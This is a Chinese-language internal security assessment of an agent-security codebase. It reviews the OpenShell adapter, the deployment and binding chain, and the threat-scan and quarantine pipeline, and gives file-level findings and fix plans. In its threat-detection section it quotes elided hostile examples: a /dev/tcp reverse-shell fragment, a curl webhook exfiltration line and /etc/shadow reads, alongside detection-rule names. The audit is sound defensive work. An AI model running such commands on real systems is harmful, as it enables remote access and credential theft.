# 第三轮深度评估：OpenShell 二次开发专项 + P0/P1 修复核验 + 残留风险（2026-08-20）

- **评估对象**：`/home/maoyd/siq/siq-agent-security`，基线 HEAD `06e7e24`（同一日内评审后 7 提交：`4d2d06b` P0 / `02deb33` P2 / `3109457` P1 / `4cc352d` connectors P1.5+P1.7 / `c423616` 前两轮审计文档落库 / `325ef83`+`06e7e24` P1-4 七源新发现源）。另有未入库 WIP（rulepack 版本化 / OCSF export / deployment_verify / compat 矩阵+CI），本文结论以 06e7e24 工作树为准，WIP 不计入。
- **前序结论**：见同日 `agent-security-audit-20260820-153735.md`（审计）与 `agent-security-deep-assessment-20260820.md`（复核，其 P0/P1 清单被本次修复直接消费）。
- **方法**：主评估人亲读源码（OpenShell 适配器全量、compiler、deploy/rollback/drift 路由、threat 流水线、connector Go 侧、迁移 0009–0012）+ 2 路只读核验子代理往返（威胁检测与隔离闭环 / Binding 部署链端到端）+ 子代理关键断言逐条 spot-check（web client / enforce 徽标 / excerpt 脱敏 / AgentInstance 写入方 / env mode 端点）。Edge claim·指纹·eval 线被 stage-2 分类器故障两次拦截，列待核验。全量测试套件本机执行两次均 `exit 0`（threat 文件 56 用例单跑绿；binding+policy_flow 35 passed）。
- **边界声明**：本机未连真实 OpenShell 网关（OpenShell 侧语义依赖既有实弹记录：v0.0.83/v0.0.104 隔离网关闭环）；Go 编译器本机不可用，connector 侧以提交内 CI 自述 + 人工读码为准；本评估不构成安全认证。

---

## 1. 修复执行核验（第二轮 P 项 → 当前代码现状）

> 结论先行：**"产品承诺偏差"的三处红牌全部以 fail-closed 方向落盘，无反向妥协**。以下为逐项核验（行号以 HEAD `06e7e24` 工作树为准）。

| 项 | 要求 | 现状 | 证据 |
| --- | --- | --- | --- |
| P0-1 越权 target | 部署 target 由服务端从 active 绑定解析，客户端不可指定 | ✅ 安全闭合 / ⚠️ 链完整度断（R-1） | `policies.py:393-405` 只接受 `binding_id`，393-404 行校验 active/同环境/selector 命中，`target = binding.backend_target_id`；旧 target 字段 422 拒收（extra=forbid，测试 :144）；`(tenant,backend,target)` 唯一 → 409。**但部署链依赖的 AgentInstance 在生产代码中零写入方**（全仓 grep 仅 models.py 类定义 + 测试直插，`binding_helpers.py:3` 自述"无独立写入 API，库内直插"）→ 干净库 binding 恒 404 → 部署恒 404，见 §2.4 R-1 |
| P0-2 静态策略安全错觉 | 静态段（needs_generation）修复前不得入 effective | ✅ 闭合（门禁正确） | `cli_backend.py:422-426` `create_generation` 仍抛 `AdapterError`（网关 SandboxResponse 解码缺陷经 CLI 未修）；`policies.py:438-439` 编译后若 `needs_generation` 直接 `422 static_generation_unavailable`，**先于任何状态落库** |
| P0-3 恶意脚本检测 | 最小流水线：静态规则+AST，Finding 带分析器字段，隔离单 | ✅ 首版落盘，**质量见 §3.1** | `threat_analysis.py`（纯静态、无执行、无模型）、`threat.py` 38-199（scan→Finding→自动 QuarantineCase→audit/outbox）、迁移 0010、`test_threat_analysis.py` 正负样本 |
| P2-3 能力文档 | probe 版本真实探测，不硬编码 | ✅ 闭合 | `cli_backend.py:63-98`（保守正则，解析不到=unknown）、`257-298`（gateway info → `--version` 回退 → unknown 保守降级）、contract docstring 明列各域 `unknown`/`unsupported` 判据；`v0.0.104+` 退役 docker 静默回退（`cli_backend.py:310-325`） |
| P1-1 verify 分级 | 配置读回只能标 readback_verified | ✅ 闭合 | `contracts.py:56-59` 三级；`cli_backend.py:428-485` 返回 `VERIFY_LEVEL_READBACK/FAILED`；deploy 落 `deployment.verification.level + method=config_readback`（`policies.py:446-455`）；**`effective` 判定仍基于 readback**——语义标注已诚实区分（"后端配置与期望一致"≠"行为执行"），与 §15.3 行为 fixture 待办一致 |
| P1-2 事件流真实性 | stream_events 不得伪装行为事件 | ✅ 闭合（降级标注） | `cli_backend.py:507-526`：type 改 `policy_history`/`backend_unavailable`，`source=cli_policy_list_readback`，docstring 明令消费方不得当行为证据 |
| P1-5 任务原子领取 | FOR UPDATE/SKIP LOCKED 或等价 | ✅ 闭合（lease+条件 UPDATE 语义） | `environments.py:201-262`：`or_` 租约条件 + 条件 UPDATE `rowcount==1` 判定，`SKIP LOCKED` 类数据库兼容说明见 docstring；迁移 0012 |
| P1-7/8 候选入账与指纹 | 保留 artifact_digest/attributes，drift 留痕 | ✅ 闭合 | `inventory.py:345-378` digest 变→`digest_observations` 追加（近 20 条），migration 0011；confirm 对 `system_id` 做存在+同租户 422（`inventory.py` confirm 端点） |
| P1-6 字节预算 | 预算耗尽显式错误，不回落 1MiB | ✅ 闭合（Go 侧） | `directory/readFileLimited` maxBytes<=0 → `errBudgetExhausted`（4cc352d diff），截断写 `batch.Truncated` + 候选属性 `bytes_read/bytes_limit/content_truncated` |
| P1-4 新发现源（跨系统发现广度） | docker 之外的 agent 发现通道 | ✅ 已落盘 | `325ef83` connectors 新增 systemd / kubernetes / process / mcp / piagent / workbuddy / dify 七源 + `06e7e24` contracts 与控制面集成；逐源行为/误报核验不在本轮范围（§5 待核验） |
| P1-1 发现去标签（docker） | `siq.agent=true` 不得作发现前置 | ✅ 闭合但引入 F-D1 缺陷 | `docker/connector.go:214+` `listContainers` 枚举全部可见容器 → 标签(1.0)/关键词 heuristic(0.8)/`agentSignals`(0.6) 三层分类。⚠️ Go map 遍历顺序随机（`classifyContainer` 中第一个命中关键词即 break）→ 同容器多关键词命中时 framework 归属**非确定**；且 `agentSignals` 含 `agent` 短词（`webagent-frontend` 类容器会被启发式打标） |
| P1-4 readiness 非硬拒 | 静态策略/非 block 模式至少显式 unsupported | ✅ 闭合（422 文案引用能力文档） | `policies.py:421-428`（非 block → 422 `capability_unsupported: enforcement_mode.*`）；`contracts.py` 每域显式 supported/unsupported/unknown + `advisory/observe/enforce` 语义 |
| Enforce 徽标诚实 | 有任一 effective 部署即标 enforced | ⚠️ 部分改善 | 部署强制走 binding（绑定即目标），徽标仍以 deployment.status==effective 为准（§3.4 残留） |

**测试/回归**：全量 pytest 本机两次 `exit 0`；新增 `test_runtime_binding.py`、`test_threat_analysis.py`（56 用例）、`test_edge_task_lease.py`（152 行）、0011/0012 迁移可干净库回放（提交声明 + 迁移脚本 replay 验证）。ruff B018 两处修复（`parsed.port` 显式校验）。子代理提示：**binding/deploy 全组测试依赖测试夹具直插 AgentInstance**，掩盖了 R-1 生产断链（无"干净库→部署可达"的正向用例）。

**诚实声明未变**：生成 lifecycle（create→validate→verify→cutover→observe→rollback）仍未落地，静态 fs/process 段不可部署门禁正确保留。

---

## 2. OpenShell 二次开发专项评估

> 命题：本项目对 OpenShell 的二次开发，作为"杀毒 software 的管控（quarantine isolation）"环节，当前成立吗？差在哪？

### 2.1 成立的部分（值得保住）

1. **Adapter 而非 Fork 的路线选对了**（ADR-009/010 推断）：版本化能力文档 + 能力探测 + 静态策略门禁，没有把 OpenShell 当黑盒全量托管，也没有开 fork 口子。这是两条路里维护成本更低、语义更可控的一条。
2. **静态"不可部署"门禁是正确姿态**：`create_generation` 抛错 + 部署期 422，意味着**文件/进程/静态网络策略不会伪装成 effective**。这是把"网关 SandboxResponse 解码缺陷"从"隐性 bug"升格为"显式产品约束"。
3. **verify 分级防误导性**：readback_verified 与 enforcement_verified 的合同分离 + deploy 落 `verification.level`，未来接入行为 fixture 时不需改状态机。
4. **网络段动态热更新是真实闭环**（v0.0.104 实弹背书）：`apply_dynamic` 合并当前静态段 + 替换网络段 → `policy set` → revision 读回，`expected_revision` 防带外覆盖（`cli_backend.py:396-399`）。

### 2.2 专项发现（本轮，均有 file:line）

> n.b. 以下 B1–B5 为**新发现**，此前两轮未覆盖，按严重度排序。

**B1（P0'，等价 P0）— 静态策略全域不可部署 = 五域管控只剩网络一域可生效**

- 证据链：`policy_compiler.py` filesystem/process → `needs_generation=True`（33-34、88-93、94-97 行）；`cli_backend.py:422-426` `create_generation` 直接抛错；`policies.py:438-439` 部署期 422。
- 后果：五域编辑器里 4/5 域（文件/进程/静态网络+dynamic 之外的段）审批通过后**部署必然失败**；能真正"阻断"的只有动态网络段。产品对外讲"五域精准管控"在 executived 层实际是"一域"。
- 定性：这不是代码 bug，是**执行后端能力缺口被门禁诚实暴露**——但产品侧必须把"哪些域当前可生效"做进 UI 徽标与 README 支持矩阵，否则就是承诺偏差回潮。
- 建议：短期——enforce 徽标按 capability 文档逐域标注（supported=可强制 / unknown=待探测 / unsupported=当前不生效）；中期——把 generation 路径的解锁当作对 OpenShell 上游/下游团队的可协商明确要求（修 SandboxResponse 解码 or 提供 CLI 建箱动作），不是产品内部能单侧绕过的。

**B2（P0'）— `read_effective_policy` 的 enforcement_mode 从硬编码 block 改 unknown，但 `apply/verify` 链路对 unknown 的语义未闭环**

- 证据：`cli_backend.py:368-370` 读回 `enforcement_mode="unknown"`（网关输出不含该字段）；contract docstring 明令"不可确定不得编造"（`contracts.py` PolicySnapshot）。
- 残留：**deploy 落 effective 时写进 `deployment.verification` 的 mode 来源**是期望策略的 block（client 发出），而**读回的 actual mode 恒 unknown**——"期望 block"与"实际 unknown"之间没有任何断言/告警。若未来网关真支持 audit_only 且我们下发了 block 语义策略、但网关按 audit_only 执行，drift 检测（只比 revision + 网络允许集）抓不到。
- 建议：drift/verify 增加一条"实际 enforcement_mode == 期望"检查（unknown 时记 finding 而非 fail，避免现状下噪声）；能力文档把 `enforcement_mode.block=supported/enforce` 的 basis 与"读回不可验证"并列标注。

**B3（P1）— 静态段 merge 的"静默继承"是隐性弱化管理**

- 证据：`apply_dynamic` 对 `current.filesystem/process` **原样合并回写**（`cli_backend.py:403-408`：取网关现值拼进 merged doc）。即：网关侧沙箱若已被带外改成更宽松的文件边界，我们下一次动态网络更新会把**那个更宽的边界原样固化回去**，产品侧完全无感知（change plan diff 也不比 expected vs 现值静态段）。
- 建议：`plan_change` 增加"静态段变更检测"：现值静态段 ≠ 本制品静态段 → `kind=generation` 或 `static_drift` 高严重 finding，禁止按 dynamic 热更。

**B4（P1）— CLI 环境依赖面偏宽**

- 证据：`_subprocess_runner` 只固定 `PATH`（`cli_backend.py:238`：`env={**os.environ, "PATH":...}`）——其余上百个 env 变量（含 `*TOKEN*`、`AWS_SECRET*` 之类，若宿主环境里挂着）都会注入 openshell CLI 子进程；`_default_env_script` 依赖 `SIQ_AS_OPENSHELL_ENV_SH` 指向的 shell 脚本（其内容在 CLI 环境里 source），等于把"网关可达性 + 认证"外包给一段宿主 shell。
- 建议：CLI 子进程用**最小化 env 白名单**（不继承 `*TOKEN*/*KEY*/*SECRET*`）；env.sh 改为显式解析为固定变量集（或走 `--gateway-endpoint` + token header 模式，去 shell 化）。

**B5（P2）— 版本解析正则与"v0.0.104 语义"耦合，升级即需人肉 re-probe**

- 证据：`_VERSION_LINE_RE/_CLI_VERSION_RE`（`cli_backend.py:65-66`）+ `v0.0.104+` 退役 docker 回退判断（`310-325`）+ 能力文档 basis 里硬编码"实测 v0.0.83/v0.0.104"（`85-135`）。
- 后果：网关升到 v0.0.110+ 时，能力文档**不会自动上调**（这是对的，保守），但没有"请重跑 capability matrix"的显式提醒/CI 钩子。
- 建议：probe 在"探测版本 ≠ 能力文档 basis 版本"时 emit 一条 advisory finding（`capability_baseline_stale`），进风险中心，逼人工确认而不是静默保守。

### 2.4 R-1（本轮最高优先残留）— 部署链在干净库上端到端不可达

- **断链环**：`deploy → binding → AgentInstance`，而 **AgentInstance 无生产写入路径**（bindings.py:31-37 要求既有 instance；edge_upload_batch 只落 Evidence/AgentAsset/PermissionFact（inventory.py 311-450 段）；smart-scan 只下发 scan 型 EdgeTask；confirm/dismiss 只升 AgentAsset.status）。
- 全仓生产代码 AgentInstance 仅剩 3 个读方（bindings 存在性/policies selector/inventory instances 列表）；测试 helper 注释自认"asset/instance 无独立写入 API，库内直插"（tests/binding_helpers.py:3）。
- **后果**：干净生产库上 binding create 恒 404 → deploy 恒 404 → 网络策略管控闭环**不可达**（P0-1 的安全语义闭合是真实的，但把锚点挂到了 0 写入方的表上）。
- **次级断链（本轮确认）**：`Environment.mode` 仅创建时可固定（默认 discovery），**无 mode 更新端点**（environments.py 路由确认无对应 PUT/PATCH/flip）→ 生产环境建成 discovery 后无法原地升 enforce，部署恒 409 `environment_not_in_enforce_mode`（policies.py:387-388）。
- **修复建议（二选一，工作量 1 个 commit）**：① 补 `POST /agents/{asset_id}/instances`（policy:manage + 要求 evidence 佐证 + 走审计/outbox）；或 ② binding 锚点直接挂 AgentAsset（去 instance 依赖，asset 级绑定更贴近"资产即管控对象"的产品语义；deploy 前校验同步改）——②改动面更小且更符合对外叙事。同时补 env mode 翻转端点（env:manage + 降级到 discovery 需审批，升 enforce 需二次确认）。
- R-2 rollback 无 expected-revision 保护（cli_backend.py:487-505：仅 policy get --rev N-1 盲写）见 B1 建议的中期线。

### 2.3 结构性绑定与"杀毒范式"差距（管控/行为域）

- **双轨的目标架构**已由前轮评审确认为方向（OpenShell 沙箱 + Host Sensor/OS 强制），本仓库当前只落 OpenShell 一轨。OpenShell 管不到的（宿主机直跑 hermes/piagent/workbuddy、任意进程 rename、非沙箱网络旁路）= 产品承诺"精准管控"的真实缺口，不是适配器代码能补的。
- **行为事件**：`stream_events` 现在诚实地降级为 `policy list` 文本回读（source 标注 `cli_policy_list_readback`）。这是"降级为真"的正确做法，但也意味着**任何行为管控（EDR 范式）当前零数据源**。行为事件需走双轨的 Host Sensor（auditd/eBPF/OpenShell Interceptor 三选一或叠加），不在本 OpenShell adapter 单侧解。
- **阻断证据**：verify 仍是"读回配置一致 + 合成 deny 端点 membership"（`policies.py:404` 的 `10.255.255.255:1`，`cli_backend.py:448-475`），**没有任何一次真实运行时 allow/deny 探测**。在行为事件通道落地前，"阻断已生效"永远只是 readback 级断言。

---

## 3. 非 OpenShell 部分的新发现（威胁/隔离线由核验子代理往返 + 主评估人 spot-check 确认）

### 3.1 威胁检测与隔离闭环（威胁线核验结论，关键断言已亲自复核）

**R-3 content 未绑定 artifact_digest（③.1 原发现，子代理 C1 再确认，威胁线头号问题）**
- `threat.py:46-63`：扫描门禁仅"asset 同租户 404 + `finding:manage`"；content 来自调用方请求体 base64 解码，**从不与 `asset.artifact_digest`（P1-8 已落库）比对**，`evidence_ids` 裸传（仅非空校验）不验证存在性/同租户。
- 完整投毒链（子代理 C1 给出五步攻击路径，成立）：同租户持 security_admin/finding:manage 者 → 选任意已确认 asset → POST threat-scan 投喂自造 critical 载荷（如 `bash -i >& /dev/tcp/...`）→ 该 asset 落 open Finding + quarantined 隔离单，审计 `content_sha256` 指向**伪造 content**，与真实工件零关联 → 同一权限 release。危害面：告警污染/误报复用/审计失真；一旦 R-4 的 isolation 接入强制动作，升级为我方自伤面（锁租户自家 agent 的部署通道）。
- 修复成本极低：threat-scan 增加语义强约束——`content_sha256` 或显式 `source_evidence_id` 必须与 asset 的 artifact_digest/evidence content_hash 对得上，否则 422 `content_not_bound`；UI 扫码框展示当前 fingerprint 内嵌 digest（天然防伪）。若后续 Connector 侧补 content 上传能力，协议需 redaction_profile + 上限 + 签名，**且必须同批携带 content_hash 与 artifact_digest 绑定校验**。
- 附带确认干净面（正面）：跨租户被 404 封死；content 不落库（审计只存 sha/detected_type/match_count/rule_ids）；`to_record` 只存 excerpt（**但见 R-7 下述缺陷**）。

**R-7（新发现，P1 级信息暴露）— excerpt"脱敏"实为截断，可携带秘钥明文前段**
- spot-check 复核：`threat_analysis.py:30-47` `to_record` 存 `excerpt = 命中前 40 字符`，docstring 自称"截断脱敏摘要"，**无任何打码/遮蔽逻辑**（`_EXCERPT_MAX=40`）。
- 可证实反例：`curl ... https://webhook.34s.../ABC123` 类 webhook-exfil 命中的行，40 字符窗口可覆盖明文 token/API key 前段；300+ 字符 base64 明文凭证行命中 base64-blob → excerpt 存前 40 字符**原文**。matches 列随 Finding 行存库 → 风险中心页（有 agent:read 的普通用户可读）可达。
- 修复：入库前对 excerpt 做 redaction（key/token/base64 长串 → `***`），或只存 `excerpt_sha256`+行号（定位已够用，sha 也在 record 里）——后者零风险，建议直接取后者。

**R-8（新发现，检测真伪问题）— 单条 high 即自动隔离 + 已知误报向量无用例护栏**
- `threat.py:35` `_SEVERE=("critical","high")` 且无置信度二次门槛、无人工确认分支：单条 high 命中即建 QuarantineCase。子代理给出的误报样例（正常运维脚本）：`systemctl enable nginx` → persist-systemd high；诊断脚本含 `/etc/shadow` 字符串 → cred-system-files high → **一条误报即锁资产**。负向量测试仅 6 条通用样例，未覆盖已知正常运维字符串。
- 修复：(a) auto-quarantine 收紧为 critical-only（high 入 needs_review 待确认）；(b) 测试负向量补"正常运维大全"（systemctl enable / grep /etc/shadow 诊断 / cron 备份 / 合法含 sk- 的文档测试样例）；(c) 规则 `persist-systemd` 正则排除 `systemctl enable|disable`（仅匹配 unit 安装类行为）。

**R-3b（新发现，结构性漏报）— Python 语法错误 + AST 独占规则 = 静默放行**
- 子代理 A3：三条 AST 独占规则（py-os-system / py-subprocess-shell / py-ctypes-load）在文本正则集**无兄弟规则**；`ast.parse` 失败时 `_python_ast_checks` 静默 `return []`（threat_analysis.py:454-457）；覆盖验证——首行故意语法错误 + `os.system(cmd)` 的 .py 文件 → **0 命中，静默通过**（os.system/subprocess/ctypes 裸调用不被任何文本规则覆盖）。
- 不降级为 P2 的理由：这恰是"恶意脚本检测"产品承诺的头号载荷面（pip 装的恶意 .py / 被篡改的 agent 加载器多为 python），静默放行会生成**虚假安全感**。
- 修复：`os\.system\(|subprocess\..*shell\s*=\s*True|ctypes\.` 补 11-15 条文本保守正则（保守 severity=high、confidence 打标为 low，不误伤文档字符串的代价接受）；AST 解析失败时**不再静默**——至少对含 ".py/.pyw" 的文件产一条 medium "python_syntax_parse_failed" finding（不静默=诚实信号）。
- 次级缺陷（同为 A1/A3 确认）：多行命中 `break` 只记第一条 → `match_count` 实为**命中规则种数而非命中行数**（合规计数面低估）；ESM JS `import x from "y"` 首行被 `_PY_MARKER` 误判为 python（仅污染 detected_type 审计字段，无实质漏检）；zip/二进制头不展开（已声明盲区，须进 README 支持矩阵）。

**B-1 重扫覆盖历史 — matches 稳态恒 1 条，跨扫历史不可追溯**
- `threat.py:81` 重命中 `existing.matches=[record]` 整列覆盖（首扫多命中也丢：单规则 `break` + 覆盖叠加）；confidence 也被覆写；仅 evidence_ids 并集保留。修复：`matches` append + cap（如 50 条）或用 jsonb JSONB 数组去重累积；audit 侧本就只存 sha/rule_ids，不受影响。

**R-4 isolation 无运行时语义 + SoD 缺口**
- B2 证实（全仓 grep + spot-check）：QuarantineCase 仅被 models/threat 路由/schemas/迁移/tests 引用——worker/policies/inventory/risk 零消费，`AgentAsset.status` 也无 quarantined 态。**isolation = 纸面打标**：不拦 confirm、不暂停 edge 下发、不降 enforce 徽标。
- B3 SoD 成立：scan 与 release 同走 `finding:manage`（threat.py:51/233），`security_admin` 单角色（security.py:32-40）可 扫→建立→释放全流程一键包办；且 scan 入口无 asset 归属校验——**同租户任意资产**均可被他人打 isolation 标（agent_owner 反而无 finding:manage，越权反向有趣）。
- 修复（不依赖"真正沙箱隔离"落地即可做）：
  1. release 引入独立权限点 `quarantine:release`（security_admin 摘要外另建 role，或强制双人 approve）；
  2. threat-scan 增加 asset 归属校验（owner 或 `agent:manage`/admin 角色，policy 用 owner_user_id 透传校验）；
  3. isolation 创建时自动降级：该 asset 的 enforce 徽标 API 返回 `enforce_status=quarantined_quota`（UI 红字"已隔离，部署通道建议暂停"），同时 emit 的 `threat.quarantine.created.v1` 接入风险中心可读视图；
  4. 真正的运行时冻结（confirm 拦部署/workflow suspend）进 L2，与 ADR 化的"quarantine-action matrix"（记录/告警/冻结三级）对齐。

- C2 事件命名断裂：threat 域 Finding 落通用 Finding 表，但 threat-scan 只发 `threat.*` 事件，不发 `agent.finding.opened.v1` → 依赖 `agent.finding.*` 的下游（告警 hub/工单）收不到 threat Finding 产生信号；且通用 findings 路由（acknowledge/resolve/risk-accept）无 domain 门禁，可作用于 threat Finding（此为 feature 非 bug，但需在权限文档明说）。修复：threat-scan Finding 落库时补发 `agent.finding.opened.v1`（domain=threat 标注），事件名收敛原则回写 docs。

### 3.3 P1-10 分类基线：信号扩展了，但置信度是拍的

- `classification.py`（3109457 diff）引入 framework/source_type 确定性信号，eval 召回 6/8→8/8（负样本误报 0 保持）——从"纯名称关键词"跨到"名称+框架+来源"，方向对。
- 但置信度 0.9/0.8/0.6/0.3 仍是**未校准常数**，`role` 命中即 0.9 自动放行直接进 confirmed（越过 needs_review 的阈值线——需人工 double-check 该路径：role 命中 + 0.9 是否跳过低置信 review，评审建议把 0.9 也降一档或保留"首见候选一律 needs_review"硬闸）。
- 评测集（`eval-baseline`）：second round 已指出"量的是名称命中不是恶意性"。P1-10 扩的是**识别**维度。**恶意样本评测集（quarantine 规则的召回/误报）完全缺位**——`threat_analysis` 的正负样本在 test 里，但没有形成"恶意样本 → 检出率/误报告"的基线文档（第二份报告的 P0-4 验收口径"恶意样本集按类别统计召回≥95%、误报 1-5% 且人工复核"未落）。建议下一 sprint 落一份 `docs/detection-baseline.md`，哪怕只 20 条手工样本起步，否则 quarantine 规则的调参没收口。

### 3.4 Enforce 徽标与撤销语义（核验子代理 D 项确认 + R-6 新发现）

- **撤销后徽标误报确认**：`get_agent_enforcement`（inventory.py:922-970）`enforced = [d for d in deployments if d["status"]=="effective"]` **仅判 deployment.status，不查 binding 有效性**；selector 命中即纳入（`asset_id in p.selector.agent_ids`，同 selector 多资产共享 effective 列表 → 部署 target 在 A，B 徽标也可能亮）。binding revoke 只改 binding 状态（bindings.py:126-165），**不触碰任何 Deployment 行**（无级联 revoke/stale-mark）。
- **撤销未传播到执行面（本轮确认，非 bug 属语义缺口）**：`check_policy_drift`（drift.py:34-58，worker.py:138-150 周期触发）读的是 **deployment 固化时的 `dep.target`**（policies.py:405 存入 models.target），撤销后继续对旧 sandbox 做 drift 只读，policy 仍在后端沙箱生效无人收回（rollback 端点同样不查 binding）。建议：revoke 语义文档化（"撤销 ≠ 回滚，旧 target 上策略仍生效直至显式 rollback"）+ revoke 同时给相关 active deployment 打 `binding_revoked` stale 标记（drift/UI 双消费）+ 徽标判定改"binding.active 且 target 匹配"。
- **R-6（本轮新发现，P1 级）— Web 管理面在 P0-1 后被协议击穿**：`apps/web/src/api/client.ts` `createDeployment` 仍发 **旧 free-form `target`** field（:323-328），而后端 `DeploymentCreate` 已 extra=forbid 必填 `binding_id`（schemas.py:502-507）→ **管理台"部署"按钮按旧 schema 发必 422 拒收**。即：后端已闭环，前端尚未跟随，当前控制台部署操作链路是**恒失败**的；且 `/runtime-bindings`（binding 登记/列举/吊销）在 web 侧**零接入**（grep 无）——P0-1 的部署前置件（binding）在控制台**无登记入口**，只能 API/curl。修复：web 迁移 DeploymentCreate 契约 + 补 bindings 管理页（登记/状态/吊销 3 端点即可，API 已齐）。
- GOMAP 非确定性（connectors，Go 侧）：`docker.go` `classifyContainer` 的 `for k,fw := range knownFrameworks { match→break }` **Go map 迭代顺序随机** → 容器名同时含两个框架关键词时 framework 归属**不确定**（同输入不同产物，破坏 ledger/dedup 幂等性）。修复：排序遍历 `for _, k := range sortedKeys` 或加入最特化优先（最长匹配）；同理核对 new sources（process/mcp）是否有同式 map 遍历。

---

## 4. 优化建议（本轮新增，按落地成本×收益排序）

**L0 — 先让"部署可达"（R-1 + R-6，1-2 commit 内可修完，二者互为前提）**
1. **R-1 断链修复**：binding 锚点从 AgentInstance 改到 AgentAsset（推荐，见 §2.4），或补 `POST /agents/{asset_id}/instances` 写入端点；同步补 env mode 翻转端点（flip enforce 需 env:manage + 审计）。验收正例链：干净 fixture 库 → 建 env → confirm asset → 登 binding → CR → approve → deploy(effective) 全通。
2. **R-6 前端协议迁移**：`apps/web` createDeployment 从 free-form target 改 `binding_id`（schemas 固定响应同步）+ 补 bindings 管理页（登记/列表/吊销 3 端点）；直到二者落地前，README/README 标注"控制台部署链路待迁移，请走 OpenAPI/curl"。

**L1 — 检测闭环收口（1 commit 内可修完，高置信度）**
3. **R-3** threat-scan 加 `content_sha256`/evidence 与 asset.artifact_digest 绑定校验（422 `content_not_bound`）；
4. **R-7** excerpt 改只存 sha（删掉明文 window，零信息损失）；
5. **R-8** auto-quarantine 收紧 critical-only + 负向量测试补"正常运维大全"（systemctl enable / grep shadow / cron 备份）；
6. **R-3b** 补 12~15 条 os.system/subprocess(shell=True)/ctypes 文本保守规则 + `.py` 语法错误 → `python_syntax_parse_failed` medium finding（替代静默）；
7. **R-4a** isolation→enforce 徽标联动（徽标 API 返回 `quarantined_quota` 态）+ `agent.finding.opened.v1` 补发，收敛 C2 事件名断裂；
8. GOMAP 非确定性修复（docker.go classifyContainer 排序遍历/最长匹配；核对 process/mcp）。

**L2 — 治理与能力面（1 sprint 内）**
9. **R-4b** isolation SoD：release 落独立权限 `quarantine:release` + asset 归属校验；isolation 创建时自动 revoke 该 asset 的所有 active RuntimeBinding（同事务 1 行，防"已隔离资产仍可强部署"）；isolation 恢复走审批链（与风险中心处置矩阵对齐）。
10. **B-1** matches append+cap，保留多行命中证据；规则 `persist-systemd` 正则排除 `systemctl enable/disable`（降误报）。
11. `plan_change` 静态段漂移检测（B3）；rollback 加 expected-revision 保护（R-2）——`policy get` 先验 revision==expect 再改，不符即 `drift_conflict` 优于盲写。
12. CLI 子进程 env 白名单化（B4：过滤 `*TOKEN*/*KEY*/*SECRET*`）；version probe 加 capability-baseline re-probe 提醒（B5 / B1 的 `capacity_basis_stale` finding）。
13. `detection-baseline.md` 首版（≥20 恶意样本，按 下载执行/凭据读取/持久化/外传/混淆/提示注入 六类，调用 recall/FP 指标接入 CI 规则回归）；enforce 徽标 + capability 文档一致性断言（API snapshot 测试）。

**L3 — 能力解锁（下一 sprint）**
14. generation/create 路径解锁：与 OpenShell 侧对齐 —— 网关修 SandboxResponse 解码（CLI v0.0.104 路径）或 CLI 直补 open sandbox action；解锁后**必须实弹**：静态五域策略应用到 upstream planted agent，验证 fs/process 段真的 block（不止 readback），conversion 改 `enforcement_verified`；在此之前 `static_generation_unavailable` 422 保持不变（门禁红线不动）。
15. 行为事件通道：OpenShell Interceptor `observe` 模式实测 → eBPF/auditd Host Sensor 兜底（双轨对接，见 memory 的记录）；`source=gateway_events` 真实行为事件替换 `policy list` 只读。
16. 评测基准升级：malicious script recall（P0-4 验收口径"召回≥95%、误报1-5%、双人复核"）+ confidence 校准（golden set + 阈值拟合替代 0.9/0.8/0.6/0.3 拍值）。

**验收门槛（沿用并加严第二份报告 §7）**
- **干净 fixture 库部署正例全通**（L0-1 验收链）+ 负向：跨租户/吊销 binding/selector 不含/静态段 422 全绿（R-1 的负向已有，缺正向用例才是断链信号实质所在）；
- **静态域任意策略在 generation 解锁前部署期 422 不得被绕过**（加一条负向测试：monkeypatch create_generation 成功但 abilities 标 unsupported 仍拒）——此条是"不可伪装 effective"红线的回归护栏，P0-2 修复的正确性锚点；
- threat-scan 投毒负向：无 digest 绑定 422 / 绑定不符 422 / 跨租户 404（R-3 三条负例进套件）；
- excerpt 明文负向：含 key/token 的命中样本 → `matches[].excerpt` 无明文（R-7）；
- 误报负向量大全（R-8：systemctl enable nginx / shadow 诊断 / cron 备份 均不触发 critical/high）；
- enforce 徽标与 isolation/binding/capability 一致性断言（API 快照：isolation 后徽标降级、binding 吊销后徽标 stale 标记）；
- 恶意样本检出率基线文档入库并接 CI（规则改动 → 基线比对，目标召回≥95%，单类 FPR ≤5%）。

---

## 5. 未闭环 / 待核验（诚实留白）

| 事项 | 归属 | 状态 |
| --- | --- | --- |
| enforce 徽标是否 target 级 / 撤销后是否降级 | 核验子代理 B / D 项 | ✅ 已确认：仅判 deployment.status，撤销后仍"enforced"（§3.4 修复口径：binding.active 且 target 匹配 + stale 标记） |
| binding 撤销后 drift 读谁的 target | 核验子代理 | ✅ 已确认：读 deployment 固化的 `dep.target`（§3.4 语义缺口，非横向越权面） |
| Edge claim 重复投递窗口 / at-least-once 语义 | 核验子代理 C | 未核验（stage-2 分类器故障两次拒载）——下轮补读 `environments.py:201-262` + lease TTL 默认值 |
| R-1 AgentInstance 无生产写入方（断链） | 已亲自复核（全仓 grep + 测试员 bootstrap 注） | ✅ 确认：断链成立，L0 修复项 |
| R-6 web 侧旧 `target` 契约 + bindings 无 UI | 已亲自复核（client.ts:323-328 / grep 零接入） | ✅ 确认：恒 422 + 零登记入口，L0 修复项 |
| P1-4 contractapi web spread / piagent/workbuddy/dify 各 connector 行为核验 | 下轮 | 未核验 |
| Go 侧三连接器本机编译与竞态（本机 go 工具链状态） | CI / 本机 | 未验证 |
| OpenShell 真实多版本（v0.0.104 → 后续）动态能力复核 | 网关环境 | 未验证（保守 unknown 已就位） |
| 双轨 Host Sensor 架构落地（不在本仓单侧解） | 架构层 | 方向已定，未开工 |

## 结论

OpenShell 二次开发的**工程姿态是对的**：adapter 不 fork、能力探测不假设、静态不可用即硬门禁、事件流不伪装、verify 分级防误导——按"管控"这一档单侧评价，这是少见的高诚实度实现。2026-08-20 一天内连推 7 提交（P0/P1/P2 全闭环）的方向判断与实现质量都对。但"产品可用性 ≠ 代码正确性"，本轮最深的暴露是**三条链路在真实使用路径上断掉或失真**：

1. **管控链路断在最便宜的环节（R-1）**：安全语义闭合（binding 强绑定、fail-closed 门禁、单条 pytest 绿）都成立，但部署链的锚点（AgentInstance）在生产上零写入 → **fresh install 之后部署恒 404**。修的不是"安全 bug"是"1 个写入端点 / 或把锚点下沉到 asset 级"。叠加 env mode 无翻转端点，L0-1 链需两个小改动 + 1 组正例测试。
2. **Web 管理面与 P0-1 后的 API 协议脱节（R-6）**：控制台部署按钮按旧契约发 `target` 必 422，入口件 bindings 无 UI。不是安全问题，是"承诺的可管理面当下不可用"。
